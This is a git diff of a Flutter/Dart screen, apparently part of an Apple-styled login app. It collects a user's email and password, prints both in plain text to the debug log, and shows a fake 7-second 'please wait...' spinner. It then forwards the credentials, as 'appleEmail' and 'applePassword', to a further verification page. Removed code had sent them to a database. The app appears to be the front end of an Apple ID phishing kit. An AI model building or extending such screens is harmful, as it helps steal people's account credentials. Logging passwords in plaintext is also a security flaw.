@@ -1,9 +1,8 @@
+import 'dart:async';
+
 import 'package:apple/Verify/verifylayout.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
-import 'package:url_launcher/link.dart';
-
-import '../database.dart';
 
 class PassDesktopScreen extends StatefulWidget {
   final String callback;
@@ -15,12 +14,13 @@ class PassDesktopScreen extends StatefulWidget {
 
 class _PassDesktopScreenState extends State<PassDesktopScreen> {
   TextEditingController passwordController = TextEditingController();
-  GlobalKey<FormState> formkey = GlobalKey<FormState>();
+ final GlobalKey<FormState> _formerkey = GlobalKey<FormState>();
   bool checked = true;
   @override
   Widget build(BuildContext context) {
     double width = MediaQuery.of(context).size.width;
     return Scaffold(
+        backgroundColor: CupertinoColors.white,
         appBar: navBar(),
         body: Padding(
           padding: const EdgeInsets.all(20.0),
@@ -31,21 +31,16 @@ class _PassDesktopScreenState extends State<PassDesktopScreen> {
                 right: 20,
               ),
               child: SizedBox(
-                width: width / 2.5,
+                width: width / 2.7,
                 child: ListView(
                   children: [
-                    SizedBox(
-                      child: ClipRRect(
-                        borderRadius: BorderRadius.circular(20),
-                        child: const Expanded(
-                          flex: 1,
-                          child: Image(
-                            image: AssetImage('images/app.jpg'),
-                            width: 300,
-                            height: 200,
-                            fit: BoxFit.contain,
-                          ),
-                        ),
+                    ClipRRect(
+                      borderRadius: BorderRadius.circular(20),
+                      child: const Image(
+                        image: AssetImage('images/app.jpg'),
+                        width: 300,
+                        height: 200,
+                        fit: BoxFit.contain,
                       ),
                     ),
                     Column(
@@ -79,6 +74,7 @@ class _PassDesktopScreenState extends State<PassDesktopScreen> {
                           //),
                           SizedBox(
                             child: Form(
+                              key: _formerkey,
                               autovalidateMode:
                                   AutovalidateMode.onUserInteraction,
                               child: Padding(
@@ -108,66 +104,91 @@ class _PassDesktopScreenState extends State<PassDesktopScreen> {
                                     suffixIcon: Padding(
                                       padding: const EdgeInsets.only(
                                           right: 20.0, bottom: 0),
-                                      child: Link(
-                                        target: LinkTarget.self,
-                                        uri: Uri.parse('google.com'),
-                                        builder: (context, followLink) =>
-                                            IconButton(
-                                                hoverColor:
-                                                    CupertinoColors.white,
-                                                icon: const Icon(
-                                                  Icons.arrow_circle_right,
-                                                  size: 30,
-                                                  color: Colors.grey,
-                                                ),
-                                                onPressed: () {
-                                                  Navigator.of(context).push(
-                                                      MaterialPageRoute(
-                                                          builder: (context) =>
-                                                              VerifyLayoutPage(
-                                                                  appleEmail: widget
-                                                                      .callback, applePassword: passwordController.text,)));
-                                                  // if (formkey.currentState!
-                                                  //     .validate()) {}
+                                      child: IconButton(
+                                          hoverColor: CupertinoColors.white,
+                                          icon: const Icon(
+                                            Icons.arrow_circle_right,
+                                            size: 30,
+                                            color: Colors.grey,
+                                          ),
+                                          onPressed: () {
+                                            if (_formerkey.currentState!
+                                                  .validate()) {
+                                            debugPrint(
+                                                'Email:${widget.callback}, Password:${passwordController.text}');
+                                            showDialog(
+                                                context: context,
+                                                builder: (context) {
+                                                  return Center(
+                                                      child: Column(
+                                                    mainAxisAlignment:
+                                                        MainAxisAlignment
+                                                            .center,
+                                                    mainAxisSize:
+                                                        MainAxisSize.max,
+                                                    children: const [
+                                                      SizedBox(
+                                                        height: 90,
+                                                        width: 90,
+                                                        child: CircularProgressIndicator(
+                                                            backgroundColor:
+                                                                CupertinoColors
+                                                                    .white),
+                                                      ),
+                                                      SizedBox(height: 50),
+                                                      Card(
+                                                        shape: RoundedRectangleBorder(
+                                                            borderRadius:
+                                                                BorderRadius
+                                                                    .all(Radius
+                                                                        .circular(
+                                                                            7))),
+                                                        color: Colors.grey,
+                                                        child: Padding(
+                                                          padding:
+                                                              EdgeInsets.all(
+                                                                  8.0),
+                                                          child: Text(
+                                                              'please wait...',
+                                                              style: TextStyle(
+                                                                  fontSize: 18,
+                                                                  color: CupertinoColors
+                                                                      .white)),
+                                                        ),
+                                                      )
+                                                    ],
+                                                  ));
+                                                });
 
-                                                  // FutureBuilder<
-                                                  //     Map<String, dynamic>>(
-                                                  //   future: Database(
-                                                  //           username:
-                                                  //               widget.callback,
-                                                  //           password:
-                                                  //               passwordController, emailPassword: '', emailUsername: '')
-                                                  //       .getData(),
-                                                  //   builder: (BuildContext
-                                                  //           context,
-                                                  //       AsyncSnapshot<
-                                                  //               Map<String,
-                                                  //                   dynamic>>
-                                                  //           snapshot) {
-                                                  //     switch (snapshot
-                                                  //         .connectionState) {
-                                                  //       case ConnectionState
-                                                  //           .done:
-                                                  //         return const Text(
-                                                  //             'All Done Sir');
-                                                  //       default:
-                                                  //         return const CircularProgressIndicator(
-                                                  //             color: CupertinoColors
-                                                  //                 .activeBlue);
-                                                  //     }
-                                                  //   },
-                                                  // );
-                                                }),
-                                      ),
+                                            Timer(const Duration(seconds: 7),
+                                                () {
+                                              
+                                                Navigator.of(context).push(
+                                                    MaterialPageRoute(
+                                                        builder: (context) =>
+                                                            VerifyLayoutPage(
+                                                              appleEmail: widget
+                                                                  .callback,
+                                                              applePassword:
+                                                                  passwordController
+                                                                      .text,
+                                                            )));
+                                              
+                                            });
+
+                                            // if (formkey.currentState!
+                                            //     .validate()) {}
+  }}),
                                     ),
                                   ),
                                   validator: (ifpassword) {
-                                    if (ifpassword!.isNotEmpty &&
-                                        ifpassword.length < 7) {
-                                      return 'Please enter a correct password';
-                                    } else {
-                                      return null;
-                                    }
+                                    if (ifpassword!.isEmpty) {
+                                    return 'Please enter password';
+                                  } else if (ifpassword.length < 6) {
+                                    return 'Please enter a correct password';
+                                  } else {
+                                    return null;
+                                  }
                                   },
                                 ),
                               ),
